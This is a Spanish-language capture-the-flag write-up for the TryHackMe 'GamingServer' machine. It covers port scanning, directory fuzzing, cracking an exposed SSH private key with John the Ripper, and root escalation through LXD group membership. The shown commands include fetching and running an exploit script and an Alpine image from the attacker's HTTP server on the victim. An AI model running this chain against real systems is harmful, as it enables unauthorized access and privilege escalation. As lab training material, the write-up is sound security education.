# 🎮 GamingServer - TryHackMe CTF  
**Fecha:** 15 de Noviembre, 2025  
**Plataforma:** TryHackMe  
**Autor:** rSamCod   
**Resumen:**  
Máquina centrada en obtención de una key SSH expuesta, crackeo con John The Ripper y escalada de privilegios mediante vulnerabilidades en LXD usando contenedores Alpine.

---

## Enumeración inicial  

Realizamos un escaneo completo con **nmap**:

- **`-p-`** → escanea todos los puertos  
- **`-sS`** → SYN scan  
- **`--open`** → muestra solo puertos abiertos  
- **`--min-rate 5000`** → envía mínimo 5000 paquetes por segundo  
- **`-vvv`** → máxima verbosidad  
- **`-n`** → evita DNS  
- **`-Pn`** → omite ping  
- **`-oG`** → salida grepable  

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.65.131.138 -oG allPorts
```

<img width="1893" height="720" alt="Captura de pantalla 2025-11-19 211604" src="https://github.com/user-attachments/assets/e3f30e75-d0b1-4e27-954f-4888c04f7f5b" />


## Escaneo profundo
```bash
nmap -p22,80 -sV -sC 10.65.131.138 -oN targeted
```

<img width="1887" height="858" alt="Captura de pantalla 2025-11-19 211658" src="https://github.com/user-attachments/assets/cef89e9c-8e9f-497f-9c29-bfed584e62c0" />


## Fuzzing de directorios
```bash
gobuster dir -u 10.65.131.138 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

<img width="1907" height="688" alt="Captura de pantalla 2025-11-19 212132" src="https://github.com/user-attachments/assets/a730d688-a249-46a0-bcec-d27bbc6edddc" />


Encontramos:

**Directorio:** ```/secret/```
Posible usuario (hallado en el código fuente del index): ```john```

<img width="1895" height="840" alt="Captura de pantalla 2025-11-19 212005" src="https://github.com/user-attachments/assets/0554f925-bcad-4728-8d9f-88acea40124d" />


## Robo y crackeo del id_rsa
Dentro del directorio secret encontramos una RSA PRIVATE KEY.

<img width="1904" height="820" alt="Captura de pantalla 2025-11-19 212331" src="https://github.com/user-attachments/assets/ff86423e-08f0-4cd7-a34b-39adb3e0cbf8" />


Convertimos la key para que John The Ripper la procese:

```bash
ssh2john id_rsa > hash
```

Crackeamos con rockyou:

```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```

<img width="1883" height="690" alt="Captura de pantalla 2025-11-19 212714" src="https://github.com/user-attachments/assets/ab2f76f6-3770-4641-9d27-187ba04228a6" />


Ajustamos permisos antes de usar la key:

```bash
chmod 600 id_rsa
```

Accedemos por SSH usando la key:

```bash
ssh -i id_rsa john@10.65.131.138
```

<img width="953" height="409" alt="Captura de pantalla 2025-11-19 213004" src="https://github.com/user-attachments/assets/94a7ea0e-a9fb-4650-a32d-1b4d1b76616f" />

Encontramos la primera flag de user.txt, vulnerando al usuario ```john```

<img width="846" height="445" alt="Captura de pantalla 2025-11-19 213029" src="https://github.com/user-attachments/assets/58003e9b-0309-474e-a390-bbd6dac7dcbe" />


## Escalada de privilegios con LXD
Verificamos grupos del usuario:

```bash
id
```

<img width="1112" height="104" alt="Captura de pantalla 2025-11-19 213122" src="https://github.com/user-attachments/assets/8de356ee-0731-4846-90c3-c14152b45626" />


Buscamos exploit disponible:

```bash
searchsploit lxd
```

```bash
searchsploit -m linux/local/46978.sh
```

Descargamos el builder desde GitHub:

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
```

Construimos Alpine:

```bash
bash build-alpine
```

<img width="1899" height="626" alt="Captura de pantalla 2025-11-19 213628" src="https://github.com/user-attachments/assets/cb6a6007-3d80-4f21-abda-637ac5f01928" />


## Transferencia de archivos hacia la víctima
En la máquina atacante levantamos un servidor:

```bash
python3 -m http.server 80
```

En la máquina víctima descargamos los archivos necesarios:

```bash
wget 192.168.129.82/exploit.sh
```
```bash
wget 192.168.129.82/alpine-v3.22-x86_64-20251119_2135.tar.gz
```

<img width="1865" height="502" alt="Captura de pantalla 2025-11-19 214017" src="https://github.com/user-attachments/assets/9be7f67a-4378-4881-be66-db2f49d710b2" />


Damos permisos al exploit:

```bash
chmod +x exploit.sh
```

Ejecutamos el exploit con el archivo .tar.gz:

```bash
./exploit.sh -f alpine-v3.22-x86_64-20251119_2135.tar.gz
```

<img width="812" height="195" alt="Captura de pantalla 2025-11-19 214115" src="https://github.com/user-attachments/assets/de4a2dd3-59d4-435b-9d4c-532350080ed6" />


Accedemos a la raíz del host:

```bash
cd /mnt/root
```

<img width="875" height="292" alt="Captura de pantalla 2025-11-19 214325" src="https://github.com/user-attachments/assets/2d4ec5db-a43b-4b83-ae38-6fc8536e16a6" />


Flag de root obtenida

 Lecciones aprendidas
- Las claves privadas expuestas son compromisos inmediatos.
- El código fuente de páginas web puede revelar usuarios importantes.
- John The Ripper es una herramienta esencial para crackeo de claves.
- Pertenecer al grupo lxd concede un método directo para escalar privilegios.
- Los contenedores mal gestionados representan un riesgo crítico.

